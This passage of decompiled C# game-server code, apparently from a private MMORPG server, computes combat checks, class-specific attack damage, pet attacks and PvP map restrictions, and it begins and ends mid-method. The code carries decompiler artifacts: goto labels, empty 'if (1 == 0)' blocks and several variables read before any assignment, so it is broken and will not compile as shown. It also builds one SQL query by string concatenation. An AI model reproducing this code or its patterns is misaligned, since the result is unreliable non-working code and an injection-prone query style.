			if (!MapClass.GetnpcTemplate(player.人物坐标_地图).TryGetValue(人物ID, out var value))
			{
				return -1;
			}
			if (value.FLD_BOSS != 0)
			{
				return -1;
			}
			if (武功类2.FLD_TYPE == 5 && value.Level > 69)
			{
				return -1;
			}
			if (武功类2.FLD_TYPE == 6 && value.Level > 99)
			{
				return -1;
			}
			if (value.Max_Rxjh_HP <= value.Rxjh_HP * 2)
			{
				return -1;
			}
			return 0;
		}

		public void 魔法攻击灵兽(int 武功ID, int 人物ID)
		{
			if (人物ID < 10000 || !MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out var value) || value.IsNpc == 1)
			{
				return;
			}
			int num = 0;
			if (World.TBL_KONGFU.TryGetValue(武功ID, out var value2))
			{
				double num2 = (((double)人物灵兽.灵兽基本攻击 - value.FLD_DF * 0.7 + (double)人物灵兽.灵兽基本命中) * 1.5 + (double)value2.FLD_AT * (1.0 + 人物灵兽.FLD_装备_武功攻击力增加百分比 + 人物灵兽.FLD_灵兽_武功攻击力增加百分比)) * 1.3 + (double)(base.FLD_人物基本_命中 / 4);
				double num3 = new Random().Next((int)num2 - 15, (int)num2 + 15);
				if (num3 <= 0.0)
				{
					num3 = 1.0;
				}
				发送灵兽攻击人物数据(this, 人物ID, 武功ID, (int)num3, num, value.Max_Rxjh_HP);
				人物灵兽.攻击列表.Clear();
				using (new Lock(人物灵兽.攻击列表, "攻击列表"))
				{
					人物灵兽.攻击列表.Add(new 攻击类(人物ID, 武功ID, (int)num3, num));
				}
			}
		}

		public void 物理攻击灵兽(int 武功ID, int 人物ID)
		{
			if (人物ID >= 10000 && MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out var value) && value.IsNpc != 1)
			{
				double num = ((double)人物灵兽.灵兽基本攻击 - value.FLD_DF * 0.7) * 1.5 + (double)(人物灵兽.灵兽基本命中 / 4);
				int num2 = 201;
				double num3 = new Random().Next((int)num - 15, (int)num + 15);
				if (num3 <= 0.0)
				{
					num3 = 1.0;
				}
				发送灵兽攻击人物数据(this, 人物ID, 武功ID, (int)num3, num2, value.Max_Rxjh_HP);
				人物灵兽.攻击列表.Clear();
				using (new Lock(人物灵兽.攻击列表, "攻击列表"))
				{
					人物灵兽.攻击列表.Add(new 攻击类(人物ID, 武功ID, (int)num3, num2));
				}
			}
		}

		public bool 攻击怪物检测(NpcClass npcTemp, int 武功ID)
		{
			try
			{
				if (base.人物坐标_地图 != npcTemp.Rxjh_Map || npcTemp.IsNpc == 1 || base.人物_HP <= 0 || base.Player死亡)
				{
					return false;
				}
				if (npcTemp.Rxjh_HP <= 0)
				{
					npcTemp.NPC死亡 = false;
					npcTemp.更新死亡数据();
					return false;
				}
				if ((base.Player_Job == 4 || base.Player_Job == 11) && BitConverter.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0 && 装备栏已穿装备[3].Get物品ID != 0)
				{
					发送激活技能数据(武功ID, 6);
					初始化已装备物品();
					return false;
				}
				float num = npcTemp.X - base.人物坐标_X;
				float num2 = npcTemp.Y - base.人物坐标_Y;
				double num3 = Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2);
				if (base.人物坐标_地图 == 801)
				{
					if (World.势力战进程 != 3)
					{
						return false;
					}
					if (npcTemp.FLD_PID == 15450 || npcTemp.FLD_PID == 15451 || npcTemp.FLD_PID == 15491 || npcTemp.FLD_PID == 15492)
					{
						if (base.Player_Zx == 1)
						{
							return false;
						}
					}
					else if ((npcTemp.FLD_PID == 15452 || npcTemp.FLD_PID == 15453 || npcTemp.FLD_PID == 15493 || npcTemp.FLD_PID == 15494) && base.Player_Zx == 2)
					{
						return false;
					}
				}
				if (base.人物坐标_地图 == 41001)
				{
					if (npcTemp.FLD_PID == 15121)
					{
						if (base.Player_Zx == 1)
						{
							return false;
						}
					}
					else if (npcTemp.FLD_PID == 15122 && base.Player_Zx == 2)
					{
						return false;
					}
				}
				if (base.人物坐标_地图 == 42001 && World.攻城战进程 != 3)
				{
					if (npcTemp.FLD_PID == 16430)
					{
						PkID = 0;
						return false;
					}
					if (npcTemp.FLD_PID == 16431)
					{
						PkID = 0;
						return false;
					}
					if (npcTemp.FLD_PID == 16435)
					{
						PkID = 0;
						return false;
					}
				}
				if (base.人物坐标_地图 == 42001)
				{
					DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息='" + World.ZoneNumber + "'");
					if (dBToDataTable.Rows[0]["攻城行会名"].ToString() == base.门派联盟盟主)
					{
						if (npcTemp.FLD_PID == 16430)
						{
							PkID = 0;
							return false;
						}
						if (npcTemp.FLD_PID == 16431)
						{
							PkID = 0;
							return false;
						}
						if (npcTemp.FLD_PID == 16435)
						{
							PkID = 0;
							return false;
						}
					}
					dBToDataTable.Dispose();
				}
				if (World.天魔神宫大门是否死亡 == 0 && npcTemp.FLD_PID == 16435)
				{
					PkID = 0;
					return false;
				}
				switch (base.Player_Job)
				{
				case 4:
					if (num3 > World.弓箭手打怪距离 + base.弓_猎鹰之眼)
					{
						return false;
					}
					break;
				case 5:
					if (num3 > World.医生打怪距离)
					{
						return false;
					}
					break;
				case 11:
					if (num3 > 70.0 + base.梅_玄武的指点)
					{
						return false;
					}
					break;
				default:
					if (num3 > World.其他职业打怪距离)
					{
						return false;
					}
					break;
				}
				if (武功ID != 0)
				{
					if (!World.TBL_KONGFU.TryGetValue(武功ID, out var value) || ((value.FLD_PID == 601201 || value.FLD_PID == 601202 || value.FLD_PID == 100301 || value.FLD_PID == 200301 || value.FLD_PID == 300301 || value.FLD_PID == 400301 || value.FLD_PID == 500301 || value.FLD_PID == 800301) && base.FLD_情侣.Length == 0) || base.Player_Job != value.FLD_JOB || (value.FLD_ZX != 0 && 师傅数据.STNAME != "" && base.Player_Zx != value.FLD_ZX) || (base.Player_Job_leve < value.FLD_JOBLEVEL && (师傅数据.STNAME == "" || base.Player_Job_leve < value.FLD_JOBLEVEL - 1)))
					{
						return false;
					}
					if (base.Player_Level < value.FLD_LEVEL && 师傅数据.STNAME == "")
					{
						return false;
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "攻击怪物检测 错误" + base.人物全服ID + "|" + base.Client.ToString() + " | " + 武功ID + " | " + npcTemp.FLD_PID + " | " + ex.Message);
				return false;
			}
			return true;
		}

		public void 物理攻击(int 武功ID, int 人物ID)
		{
			int num = 0;
			try
			{
				if (base.Client == null || 人物ID == base.人物全服ID)
				{
					return;
				}
				if (base.Player_Job == 7)
				{
					base.琴师_三和弦_发动概率 = 0.0;
				}
				num = 1;
				Random random = new Random();
				NpcClass value;
				double num12;
				double num56;
				double num63;
				int num64;
				int num7;
				int num66;
				if (人物ID >= 10000)
				{
					if (!MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out value))
					{
						return;
					}
					if (!攻击怪物检测(value, 0))
					{
						if (自动攻击 != null)
						{
							自动攻击.Stop();
							自动攻击.Enabled = false;
						}
						return;
					}
					num = 2;
					num12 = value.FLD_DF * World.怪物防御百分比;
					double num23 = base.FLD_人物基本_攻击;
					if (base.FLD_装备_追加_降低百分比防御 > 0.0)
					{
						num12 *= 1.0 - base.FLD_装备_追加_降低百分比防御 - base.武勋降低百分比防御;
					}
					if (value.FLD_BOSS == 0 && 中级附魂_复仇 > 0 && RNG.Next(1, 100) <= 中级附魂_复仇)
					{
						显示大字(base.人物全服ID, 401);
						value.发送复仇显示伤害血量(value.Max_Rxjh_HP / 3);
						value.Rxjh_HP -= value.Max_Rxjh_HP / 3;
						value.Play_Hit(this, value.Max_Rxjh_HP / 3);
						if (value.Rxjh_HP <= 0 && !value.NPC死亡)
						{
							value.发送死亡数据(base.人物全服ID);
						}
					}
					num = 3;
					if (base.Player_Job == 1)
					{
						if ((double)RNG.Next(1, 110) <= base.破甲几率)
						{
							num12 *= 得到气功加成值(1, 5, 1);
							显示大字(base.人物全服ID, 16);
						}
					}
					else if (base.Player_Job == 2)
					{
						double num34 = base.剑_无坚不摧 + base.剑_乘胜追击;
						double num45 = RNG.Next(1, 100);
						if (num45 < base.剑_无坚不摧)
						{
							显示大字(人物ID, 120);
							num12 *= 0.5;
						}
						else if (num45 < num34)
						{
							if (base.剑_乘胜追击 > 0.5)
							{
								base.剑_乘胜追击 = 0.5;
							}
							显示大字(人物ID, 120);
							num12 *= 得到气功加成值(2, 9, 1) - base.剑_乘胜追击 * 0.1;
						}
					}
					else if (base.Player_Job == 8 && (double)RNG.Next(1, 110) <= base.破甲几率)
					{
						num12 *= 得到气功加成值(8, 7, 1);
						显示大字(base.人物全服ID, 16);
					}
					num56 = num23;
					int num62 = base.FLD_人物基本_命中;
					if (base.Player_Job == 6)
					{
						if (刺_连消带打数量 != 0.0)
						{
							num56 += 刺_连消带打数量 * 0.5;
							刺_连消带打数量 = 0.0;
						}
						if (追加状态列表 != null && GetAddState(801201))
						{
							num62 = (int)((double)num62 * (1.0 + base.刺_先发制人));
						}
					}
					num63 = num56 - num12 + (double)num62 * 0.25;
					num = 4;
					int num65 = RNG.Next(0, 1);
					if (1 == 0)
					{
					}
					num66 = num65 switch
					{
						1 => 127, 
						0 => 126, 
						_ => 126, 
					};
					if (1 == 0)
					{
					}
					num64 = num66;
					if (BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
					{
						Random random2 = new Random();
						int num67 = RNG.Next(0, 1);
						if (1 == 0)
						{
						}
						num66 = num67 switch
						{
							1 => 113, 
							0 => 112, 
							_ => 112, 
						};
						if (1 == 0)
						{
						}
						int 攻击类型 = num66;
						if (base.Player_Job == 6)
						{
							int num2 = num64;
							int num3 = num2;
							if ((uint)(num3 - 112) <= 1u)
							{
								num63 *= 2.0;
							}
						}
						double num4 = random2.Next((int)num63 - 15, (int)num63 + 15);
						if (num4 <= 1.0)
						{
							num4 = RNG.Next(1, 5);
						}
						攻击计算完成(this, 人物ID, 武功ID, (int)num4, 攻击类型, value.Rxjh_HP, 0);
						return;
					}
					if (base.Player_Job == 1)
					{
						if ((double)RNG.Next(1, 100) < base.暗影绝杀)
						{
							显示大字(base.人物全服ID, 18);
							num63 *= 得到气功加成值(1, 9, 1);
						}
						goto IL_2a10;
					}
					if (base.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) < base.剑_怒海狂澜)
						{
							num63 *= 得到气功加成值(2, 7, 1);
							显示大字(base.人物全服ID, 82);
						}
						if (base.剑_破天一剑 != 0.0)
						{
							num63 *= 1.0 + base.剑_破天一剑;
						}
						goto IL_2a10;
					}
					if (base.Player_Job == 4)
					{
						if ((double)RNG.Next(1, 130) <= base.弓_心神凝聚)
						{
							num64 = 136;
							得到气功加成值(4, 7, 1);
							num63 *= 3.0;
						}
						else if ((double)RNG.Next(1, 130) <= base.弓_流星三矢 + base.弓_升天一气功_绝影射魂 + base.弓_流星三矢概率)
						{
							显示大字(base.人物全服ID, 47);
							if (追加状态列表.ContainsKey(700047))
							{
								追加状态列表[700047].时间结束事件();
							}
							追加状态类 追加状态类2 = new 追加状态类(this, base.弓_流星三矢时间, 700047.0, 1.0);
							追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
							状态效果(BitConverter.GetBytes(700047), 1, (int)base.弓_流星三矢时间);
							更新武功和状态();
							if (追加状态列表.ContainsKey(700047))
							{
								num63 = ((num56 - num12) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.0;
								num64 = 129;
								base.弓_流星三矢概率 = 30.0;
							}
						}
						else
						{
							switch (RNG.Next(0, 6))
							{
							default:
								num64 = 126;
								break;
							case 1:
								num64 = 126;
								break;
							case 2:
								num64 = 126;
								break;
							case 3:
								num64 = 127;
								break;
							case 4:
								num64 = 128;
								num63 = ((num56 - num12) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.0;
								break;
							case 5:
								num64 = 134;
								num63 = ((num56 - num12) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.5;
								break;
							}
						}
						if ((double)RNG.Next(1, 130) <= base.弓_致命绝杀)
						{
							_ = base.弓_致命绝杀;
							得到气功加成值(4, 11, 1);
							num63 *= 1.4;
							显示大字(base.人物全服ID, 140);
							触发弓箭致命绝杀 = true;
						}
						num63 += base.弓_锐利之箭 + 1.0;
						if ((double)RNG.Next(1, 130) <= base.弓_无明暗矢)
						{
							num63 *= 1.05 + base.弓_无明暗矢 * 0.005;
							显示大字(base.人物全服ID, 49);
							触发物理无明暗矢 = true;
						}
						if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
						{
							num63 *= 1.0 + base.升天五式_千里一击 * 2.0 / 100.0;
							显示大字(base.人物全服ID, 1017);
						}
						goto IL_2a10;
					}
					if (base.Player_Job == 6)
					{
						double num5 = base.刺_心神凝聚;
						if (base.当前激活技能ID != 0 && base.当前激活技能ID != 830401 && base.当前激活技能ID != 840401 && num5 != 0.0)
						{
							num5 += 20.0;
						}
						if ((double)RNG.Next(1, 130) <= num5)
						{
							num64 = 136;
							num63 *= 6.0;
							if (base.刺_致手绝命 != 0.0)
							{
								num63 += num63 * base.刺_致手绝命;
							}
						}
						else if ((double)RNG.Next(1, 130) <= base.刺_以怒还怒)
						{
							显示大字(base.人物全服ID, 372);
							num64 = 134;
							num63 *= 1.4;
							if (base.刺_一招残杀 != 0.0 && (double)RNG.Next(1, 100) <= base.刺_一招残杀)
							{
								显示大字(base.人物全服ID, 1022);
								num63 *= 1.5;
							}
						}
						else if ((double)RNG.Next(1, 130) <= base.刺_连环飞舞)
						{
							显示大字(base.人物全服ID, 272);
							int num68 = RNG.Next(0, 5);
							if (1 == 0)
							{
							}
							num66 = num68 switch
							{
								1 => 129, 
								2 => 130, 
								3 => 131, 
								4 => 132, 
								5 => 133, 
								_ => 129, 
							};
							if (1 == 0)
							{
							}
							num64 = num66;
							num63 *= 1.3;
						}
						if (base.刺_荆轲之怒 != 0.0)
						{
							base.人物_SP += (int)(3.0 + (double)base.Player_Level * 0.5 * 0.01 * base.刺_荆轲之怒);
						}
						else if (num63 <= 0.0)
						{
							base.人物_SP++;
						}
						else
						{
							base.人物_SP += 2;
						}
						if (base.刺_升天三气功_无情打击 != 0.0)
						{
							num63 += num56 * base.刺_升天三气功_无情打击;
						}
						if (base.当前激活技能ID != 0 && World.TBL_KONGFU.TryGetValue(base.当前激活技能ID, out var value8))
						{
							if (value8.FLD_武功类型 == 3)
							{
								int num6 = value8.FLD_MP + (武功新[3, value8.FLD_INDEX].武功_等级 - 1) * 武功新[3, value8.FLD_INDEX].FLD_每级加MP;
								if (base.人物_MP >= num6)
								{
									num7 = value8.FLD_AT + (武功新[3, value8.FLD_INDEX].武功_等级 - 1) * value8.FLD_每级加危害 / World.升天技能等级加成;
									魔法使用(num6);
									goto IL_3777;
								}
								发送激活技能数据(value8.FLD_PID, 2);
							}
							else
							{
								if (base.人物_MP >= value8.FLD_MP)
								{
									num7 = value8.FLD_AT;
									魔法使用(value8.FLD_MP);
									goto IL_3777;
								}
								发送激活技能数据(value8.FLD_PID, 2);
							}
							return;
						}
						goto IL_2a10;
					}
					if (base.Player_Job == 7)
					{
						int num69 = RNG.Next(0, 5);
						if (1 == 0)
						{
						}
						num66 = num69 switch
						{
							1 => 126, 
							2 => 129, 
							3 => 134, 
							_ => 126, 
						};
						if (1 == 0)
						{
						}
						num64 = num66;
						if (!检查和弦状态())
						{
							if ((double)RNG.Next(1, 110) < base.琴师_梅花三弄)
							{
								显示大字(人物ID, 87);
								int num8 = random.Next(900401, 900404);
								追加状态类 value9 = new 追加状态类(this, 10000, num8, 0);
								追加状态列表.Add(num8, value9);
								状态效果(BitConverter.GetBytes(num8), 1, 10000);
								更新人物数据(this);
							}
						}
						else if (追加状态列表.ContainsKey(900401))
						{
							if ((double)RNG.Next(1, 100) < base.琴_三和弦_状态效果)
							{
								if (random.Next(10, 12) == 10)
								{
									int num9 = base.FLD_人物基本_攻击 / 10;
									if (!value.异常状态.ContainsKey(10))
									{
										异常状态类 异常状态类2 = new 异常状态类(this, value, base.人物全服ID, 10000, 10, num9);
										异常状态类2.异常状态类出血怪物(this, num9);
										value.异常状态.TryAdd(10, 异常状态类2);
									}
								}
								else if (!value.异常状态.ContainsKey(11))
								{
									double num10 = 10000.0 + base.琴师_阳明春晓 * 1000.0;
									异常状态类 value10 = new 异常状态类(value, base.人物全服ID, (int)num10, 11, 0.0);
									value.异常状态.TryAdd(11, value10);
								}
							}
							if ((double)RNG.Next(1, 100) < base.琴师_阳明春晓 && !value.异常状态.ContainsKey(1))
							{
								double num11 = 10000.0 + base.琴师_阳明春晓 * 100000.0;
								异常状态类 value11 = new 异常状态类(value, base.人物全服ID, (int)num11, 1, 0.0);
								value.异常状态.TryAdd(1, value11);
								value.FLD_AT *= 1.0 - base.琴师_阳明春晓 * 0.016;
							}
							if ((double)RNG.Next(1, 100) < base.琴师_潇湘雨夜 && !value.异常状态.ContainsKey(2))
							{
								double num13 = 10000.0 + base.琴师_潇湘雨夜 * 100000.0;
								异常状态类 value12 = new 异常状态类(value, base.人物全服ID, (int)num13, 2, 0.0);
								value.异常状态.TryAdd(2, value12);
								value.FLD_DF *= 1.0 - base.琴师_潇湘雨夜 * 0.016;
							}
						}
					}
					else if (base.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 100) < base.谭_怒海狂澜)
						{
							num63 *= 得到气功加成值(9, 10, 1);
							显示大字(base.人物全服ID, 82);
						}
					}
					else if (base.Player_Job == 11)
					{
						if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
						{
							num63 *= 1.4;
							显示大字(base.人物全服ID, 803);
						}
						if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
						{
							num63 += (double)base.人物最大_HP * 0.2;
							显示大字(base.人物全服ID, 806);
						}
					}
					goto IL_2a10;
				}
				if (!PlayList.TryGetValue(人物ID, out var value13) || value13.GM模式 == 8 || value13.Player死亡 || value13.人物_HP <= 0 || value13.Player_Level < 35 || value13.个人商店 != null)
				{
					return;
				}
				if (base.Player死亡 || base.人物_HP <= 0 || base.Player_Level < 35 || 个人商店 != null || base.人物PK模式 == 0 || 打开仓库中)
				{
					if (自动攻击 != null)
					{
						自动攻击.Stop();
						自动攻击.Enabled = false;
					}
				}
				else if ((base.Player_Job == 4 || base.Player_Job == 11) && BitConverter.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0 && 装备栏已穿装备[3].Get物品ID != 0)
				{
					发送激活技能数据(武功ID, 6);
					初始化已装备物品();
				}
				else
				{
					if (base.人物坐标_地图 != value13.人物坐标_地图)
					{
						return;
					}
					foreach (int item in World.限制PK地图列表)
					{
						if (base.人物坐标_地图 == item)
						{
							系统提示("此地图禁止PK", 9, "限制地图");
							return;
						}
					}
					if (World.工作日限时地图是否开启 == 0)
					{
						foreach (int item2 in World.周末全天PK地图列表)
						{
							if (base.人物坐标_地图 == item2)
							{
								系统提示("此地图本时间段禁止PK", 9, "系统提示");
								return;
							}
						}
					}
					if (World.限时地图是否开启 == 0)
					{
						foreach (int item3 in World.限时PK地图列表)
						{
							if (base.人物坐标_地图 == item3)
							{
								系统提示("此地图本时间段禁止PK", 9, "系统提示");
								return;
							}
						}
					}
					num = 6;
					if (base.人物PK模式 != 1)
					{
						goto IL_1443;
					}
					if (World.仙魔大战进程 != 0)
					{
						if (!(base.仙魔大战派别 == value13.仙魔大战派别))
						{
							goto IL_1443;
						}
						系统提示("仙魔大战中同种族禁止pk....", 9, "系统提示");
					}
					else if (World.势力战进程 != 0)
					{
						if (base.Player_Zx != value13.Player_Zx)
						{
							goto IL_1443;
						}
						系统提示("势力战中同势力禁止pk....", 9, "系统提示");
					}
					else
					{
						if (base.Player_Zx != value13.Player_Zx)
						{
							goto IL_1443;
						}
						系统提示("同派系禁止pk修改pk模式在试试....", 9, "系统提示");
					}
					return;
				}
				goto end_IL_0003;
				IL_3733:
				int num37;
				double num19 = ((base.当前激活技能ID == 830401 || base.当前激活技能ID == 840401) ? (num19 + (double)num37 * 0.5) : (num19 + (double)num37 * 0.2));
				goto IL_143a;
				IL_1658:
				int num15;
				double num16;
				double num17;
				int num18;
				if (base.Player_Job == 1)
				{
					int num14 = RNG.Next(1, 100);
					if (检查毒蛇出洞状态())
					{
						num14 *= 1000;
					}
					if ((double)num14 <= base.刀_连环飞舞)
					{
						显示大字(base.人物全服ID, 272);
						int num70 = RNG.Next(0, 7);
						if (1 == 0)
						{
						}
						num66 = num70 switch
						{
							1 => 129, 
							2 => 130, 
							3 => 131, 
							4 => 132, 
							5 => 133, 
							7 => 128, 
							_ => 129, 
						};
						if (1 == 0)
						{
						}
						num15 = num66;
						num19 = (num16 - num17 + (double)(num18 / 4)) * 2.0;
					}
				}
				else if (base.Player_Job == 2)
				{
					int num20 = RNG.Next(1, 100);
					if (检查毒蛇出洞状态())
					{
						num20 *= 1000;
					}
					if ((double)num20 <= base.剑_连环飞舞)
					{
						显示大字(base.人物全服ID, 272);
						int num71 = RNG.Next(0, 7);
						if (1 == 0)
						{
						}
						num66 = num71 switch
						{
							1 => 129, 
							2 => 130, 
							3 => 131, 
							4 => 132, 
							5 => 133, 
							7 => 128, 
							_ => 129, 
						};
						if (1 == 0)
						{
						}
						num15 = num66;
						num19 = (num16 - num17 + (double)(num18 / 4)) * 2.0;
					}
				}
				else if (base.Player_Job == 3)
				{
					int num21 = RNG.Next(1, 100);
					if (检查毒蛇出洞状态())
					{
						num21 *= 1000;
					}
					if ((double)num21 <= base.枪_连环飞舞)
					{
						显示大字(base.人物全服ID, 272);
						int num72 = RNG.Next(0, 7);
						if (1 == 0)
						{
						}
						num66 = num72 switch
						{
							1 => 129, 
							2 => 130, 
							3 => 131, 
							4 => 132, 
							5 => 133, 
							7 => 128, 
							_ => 129, 
						};
						if (1 == 0)
						{
						}
						num15 = num66;
						num19 = (num16 - num17 + (double)(num18 / 4)) * 2.0;
					}
				}
				else if (base.Player_Job == 5)
				{
					int num73 = RNG.Next(0, 6);
					if (1 == 0)
					{
					}
					num66 = num73 switch
					{
						1 => 126, 
						2 => 126, 
						3 => 127, 
						6 => 127, 
						_ => 126, 
					};
					if (1 == 0)
					{
					}
					num15 = num66;
				}
				else if (base.Player_Job == 7)
				{
					switch (RNG.Next(0, 10))
					{
					case 1:
						num15 = 126;
						break;
					case 2:
						num15 = 126;
						break;
					case 3:
						num15 = 127;
						break;
					case 4:
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num15 = 128;
						break;
					case 5:
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num15 = 129;
						break;
					case 6:
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num15 = 130;
						break;
					default:
						num15 = 126;
						break;
					case 8:
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num15 = 132;
						break;
					case 9:
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num15 = 133;
						break;
					case 10:
						num15 = 134;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				else if (base.Player_Job == 13)
				{
					int num74 = RNG.Next(0, 6);
					if (1 == 0)
					{
					}
					num66 = num74 switch
					{
						1 => 126, 
						2 => 126, 
						3 => 127, 
						6 => 127, 
						_ => 126, 
					};
					if (1 == 0)
					{
					}
					num15 = num66;
				}
				else if (base.Player_Job > 7)
				{
					switch (RNG.Next(0, 10))
					{
					default:
						num15 = 126;
						break;
					case 1:
						num15 = 126;
						break;
					case 2:
						num15 = 127;
						break;
					case 3:
						num15 = 128;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 4:
						num15 = 128;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 5:
						num15 = 129;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 6:
						num15 = 130;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 7:
						num15 = 131;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 8:
						num15 = 132;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 9:
						num15 = 133;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 10:
						num15 = 134;
						num19 = ((num16 - num17) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				double num22;
				if (!value13.检查毒蛇出洞状态())
				{
					if (value13.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= value13.剑_升天一气功_护身罡气)
						{
							num19 *= 0.5;
							value13.显示大字(value13.人物全服ID, 25);
						}
						if ((double)RNG.Next(1, 100) <= value13.剑_回柳身法)
						{
							num19 = 0.0;
							value13.显示大字(value13.人物全服ID, 403);
						}
					}
					else if (value13.Player_Job == 4)
					{
						if (num22 > 100.0)
						{
							num19 *= 1.0 - value13.弓恶尽矢穷;
						}
					}
					else if (value13.Player_Job == 5)
					{
						if ((double)RNG.Next(1, 100) <= base.升天一气功_狂风天意 && !value13.怒)
						{
							value13.人物_SP = value13.人物最大_SP + 5;
						}
						if ((double)RNG.Next(1, 100) <= base.升天五式_形移妖相)
						{
							num19 = 0.0;
							显示大字(base.人物全服ID, 1018);
						}
						if ((double)RNG.Next(1, 100) <= value13.医生云心月性 && !value13.GetAddState(1000001349))
						{
							num19 = 0.0;
							value13.显示大字(value13.人物全服ID, 574);
							追加状态类 value14 = new 追加状态类(value13, 5000, 1000001349, 0);
							value13.追加状态列表.Add(1000001349, value14);
							value13.状态效果(BitConverter.GetBytes(1000001349), 1, 5000);
						}
						if (value13.GetAddState(1000001349))
						{
							num19 = 0.0;
						}
					}
					else if (value13.Player_Job == 6)
					{
						if ((double)RNG.Next(1, 110) <= value13.刺_三花聚顶)
						{
							value13.刺_连消带打数量 = num19 * value13.刺_连消带打;
							num19 = 0.0;
						}
						if ((double)RNG.Next(1, 110) <= value13.刺_升天一气功_夜魔缠身)
						{
							num19 *= 0.7;
							value13.显示大字(value13.人物全服ID, 370);
						}
						if ((double)RNG.Next(1, 100) <= value13.刺_升天二气功_顺水推舟)
						{
							value13.加血((int)(num19 * 0.2));
							value13.显示大字(value13.人物全服ID, 371);
						}
					}
					else if (value13.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 100) <= value13.谭_护身罡气)
						{
							num19 *= 0.5;
							value13.显示大字(value13.人物全服ID, 25);
						}
						if ((double)RNG.Next(1, 100) <= value13.谭_回柳身法)
						{
							num19 = 0.0;
						}
						if ((double)RNG.Next(1, 100) <= value13.谭_升天三气功_以柔克刚 + value13.升天五式_惊涛骇浪)
						{
							value13.显示大字(value13.人物全服ID, 700);
							num19 *= 0.5;
						}
					}
					else if (value13.Player_Job == 10)
					{
						if (num19 > (double)(value13.人物_HP / 2) && (double)RNG.Next(1, 110) <= value13.拳师_金刚不坏)
						{
							value13.显示大字(value13.人物全服ID, 554);
							num19 *= 1.0 - value13.拳师_金刚不坏 * 0.01;
						}
					}
					else if (value13.Player_Job == 11)
					{
						if ((base.Player_Job == 1 || base.Player_Job == 8) && value13.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= value13.梅_嫉妒的化身)
						{
							double num24 = num19 * (得到气功加成值(value13.Player_Job, 9, 1) / 2.0);
							num19 -= num24;
							value13.显示大字(value13.人物全服ID, 808);
						}
						if (value13.梅_障力恢复 > 0.0 && value13.人物_AP * 2 < value13.人物最大_AP && (double)RNG.Next(1, 100) <= value13.梅_障力恢复)
						{
							value13.人物_AP = value13.人物最大_AP;
							value13.显示大字(value13.人物全服ID, 801);
						}
						if (value13.梅_愤怒爆发 > 0.0 && RNG.Next(1, 100) <= 40 && value13.怒点 < 3)
						{
							Players players = value13;
							Players players2 = players;
							Players players3 = players2;
							players3.怒点++;
						}
						if (value13.梅_吸血进击 > 0.0 && (double)RNG.Next(1, 100) <= value13.梅_吸血进击 && value13.人物_HP * 2 < value13.人物最大_HP)
						{
							int num25 = (int)(num19 / 2.0);
							if (num25 > 2000)
							{
								num25 = 2000;
							}
							value13.加血(num25);
							value13.显示大字(value13.人物全服ID, 804);
							value13.更新HP_MP_SP();
						}
					}
				}
				if (base.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_中毒概率百分比 && !value13.GetAbnormalState(3))
				{
					异常状态类 value15 = new 异常状态类(value13, 60000, 3, 0.0);
					value13.异常状态.Add(3, value15);
					value13.中毒 = true;
				}
				if (value13.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= value13.FLD_装备_追加_中毒概率百分比 && !GetAbnormalState(3))
				{
					异常状态.Add(3, new 异常状态类(this, 60000, 3, 0.0));
					中毒 = true;
				}
				int num26;
				if (num26 != 1)
				{
					num19 *= 1.0 - value13.FLD_装备_追加_降低百分比攻击;
				}
				if (value13.FLD_装备_降低_伤害值 > 0.0)
				{
					num19 -= (double)(int)value13.FLD_装备_降低_伤害值;
				}
				num = 18;
				if (value13.全职业气功防御 + value13.大魔神添加全职业气功防御几率 >= (double)RNG.Next(1, 100) && value13.Player_Level >= 120)
				{
					num19 *= 0.7;
					value13.显示大字(value13.人物全服ID, 701);
				}
				升天四气功触发(value13);
